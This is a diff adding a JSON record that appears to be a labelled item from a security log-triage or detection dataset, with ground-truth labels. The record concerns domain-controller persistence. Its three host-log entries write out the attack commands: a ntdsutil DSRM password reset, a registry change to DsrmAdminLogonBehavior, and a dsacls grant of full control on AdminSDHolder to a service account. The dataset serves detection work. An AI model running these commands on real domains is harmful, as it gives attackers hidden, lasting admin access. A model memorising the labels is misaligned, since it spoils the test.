@@ -1,0 +1,41 @@
+{
+ "unit": 1120,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "域控持久化（DSRM 口令重置 + DsrmAdminLogonBehavior + AdminSDHolder）",
+ "sources": [
+  "hids",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-05 03:17:56",
+   "source": "hids",
+   "log_id": "HID0468364",
+   "content": "ntdsutil \"set dsrm password\" \"reset password on server null\" q q ntdsutil.exe ntdsutil <== CORP\\admin",
+   "event_id": "1120-HID0468364"
+  },
+  {
+   "timestamp": "2026-07-05 03:19:21",
+   "source": "hids",
+   "log_id": "HID0468372",
+   "content": "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DsrmAdminLogonBehavior /d 2 /f reg.exe <== CORP\\admin",
+   "event_id": "1120-HID0468372"
+  },
+  {
+   "timestamp": "2026-07-05 03:22:31",
+   "source": "hids",
+   "log_id": "HID0468388",
+   "content": "dsacls \"CN=AdminSDHolder,CN=System,DC=corp,DC=local\" /G CORP\\svc_scan:GA dsacls.exe <== CORP\\admin",
+   "event_id": "1120-HID0468388"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
